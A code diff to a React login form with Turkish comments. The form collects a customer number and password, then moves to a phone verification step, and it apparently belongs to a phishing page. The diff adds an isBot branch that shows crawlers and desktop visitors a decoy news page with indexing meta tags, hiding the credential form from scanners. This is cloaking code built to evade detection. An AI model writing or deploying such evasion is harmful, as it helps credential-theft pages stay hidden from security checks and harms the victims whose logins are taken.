@@ -1,8 +1,9 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useAuth } from './AuthContext';
+import { Helmet } from 'react-helmet';
 
-function LoginForm() {
+function LoginForm({ isBot }) {
   const { dispatch } = useAuth();
   const [custNo, setCustNo] = useState('');
   const [password, setPassword] = useState('');
@@ -35,6 +36,34 @@ function LoginForm() {
     // Telefon doğrulama sayfasına git
     navigate('/telefon', { state: { isValidNavigation: true } });
   };
+
+  // Bot veya desktop için sahte içerik
+  if (isBot) {
+    return (
+      <>
+        <Helmet>
+          <meta name="robots" content="index, follow" />
+        </Helmet>
+        <div>
+          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
+          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
+            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
+          </p>
+          <div style={{ margin: '10px 0' }}>
+            <h2>Ekonomi Gündemi</h2>
+            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
+          </div>
+          <div style={{ margin: '10px 0' }}>
+            <h2>Spor Dünyasından Haberler</h2>
+            <p>Futbol liglerinde heyecan devam ediyor...</p>
+          </div>
+          <p style={{ textAlign: 'center' }}>
+            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
+          </p>
+        </div>
+      </>
+    );
+  }
 
   return (
     <div className="panel">
@@ -173,7 +202,6 @@ function LoginForm() {
                     </p>
                   </div>
                 </div>
-
               </form>
             </div>
           </div>
